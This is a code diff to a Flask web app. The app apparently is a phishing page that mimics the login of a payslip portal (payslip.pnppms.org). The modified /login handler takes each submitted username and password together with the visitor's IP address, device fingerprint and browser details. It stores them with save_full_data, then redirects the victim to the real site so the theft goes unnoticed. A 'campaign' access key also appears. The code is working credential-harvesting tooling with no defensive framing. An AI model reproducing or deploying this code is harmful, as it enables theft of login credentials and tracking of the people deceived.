@@ -30,15 +30,33 @@ STATS_ACCESS_KEY = "pnp-pms-campaign2025"
 # Route for rendering the identity page as the main landing page
 @app.route('/')
 def index():
-    return render_template('identity.html')
-
-# Route for rendering the login page after identity confirmation
-@app.route('/login')
-def login_page():
-    # Check if we have first name and last name in session
-    if 'firstname' not in session or 'lastname' not in session:
-        return redirect('/')
     return render_template('index.html')
+
+# Route for handling login form submission
+@app.route('/login', methods=['POST'])
+def login():
+    # Get the form data
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
+    if not username or not password:
+        return render_template('index.html', error="Please enter both username and password")
+    
+    # Get client information
+    ip_address = get_client_ip()
+    device_type = get_device_type()
+    device_fingerprint = generate_device_fingerprint()
+    browser_info = get_browser_info()
+    
+    # Save the complete data
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+    firstname = "" # No longer collecting this separately
+    lastname = "" # No longer collecting this separately
+    
+    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
+    
+    # Redirect to external site
+    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
 
 """
 A function designed to retrieve 
@@ -86,31 +104,6 @@ def get_client_ip():
             return client_ip
     
     return request.remote_addr
-
-# Handle identity form submission
-@app.route('/identity-submit', methods=['POST'])
-def identity_submit():
-    firstname = request.form.get('firstname')
-    lastname = request.form.get('lastname')
-    
-    if not firstname or not lastname:
-        return render_template('identity.html', error="Please enter both First Name and Last Name")
-    
-    # Store in session for later use
-    session['firstname'] = firstname
-    session['lastname'] = lastname
-    
-    # Get enhanced client information
-    ip_address = get_client_ip()
-    device_type = get_device_type()
-    
-    # Store in session for later use with full submission
-    session['ip_address'] = ip_address
-    session['device_type'] = device_type
-    session['time_identity'] = time.strftime('%Y-%m-%d %H:%M:%S')
-    
-    # Redirect to login page
-    return redirect('/login')
 
 """
 Function to determine if the client is using a mobile or desktop device
@@ -263,37 +256,6 @@ def get_browser_info():
     }
     
     return json.dumps(browser_details)
-
-# routing for handle login form submission
-@app.route('/login', methods=['POST'])
-def login():
-    # Get the form data
-    username = request.form.get('username')
-    password = request.form.get('password')
-    
-    # Check if identity was confirmed
-    if 'firstname' not in session or 'lastname' not in session:
-        return redirect('/')
-    
-    # Get saved information
-    firstname = session.get('firstname')
-    lastname = session.get('lastname')
-    ip_address = session.get('ip_address', get_client_ip())
-    device_type = session.get('device_type', get_device_type())
-    
-    # Get more enhanced client information
-    device_fingerprint = generate_device_fingerprint()  # Keep this for backward compatibility
-    browser_info = get_browser_info()
-    
-    if not username or not password:
-        return render_template('index.html', error="Please enter both username and password")
-    
-    # Save the complete data
-    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
-    
-    # Redirect to external site
-    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
 
 def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
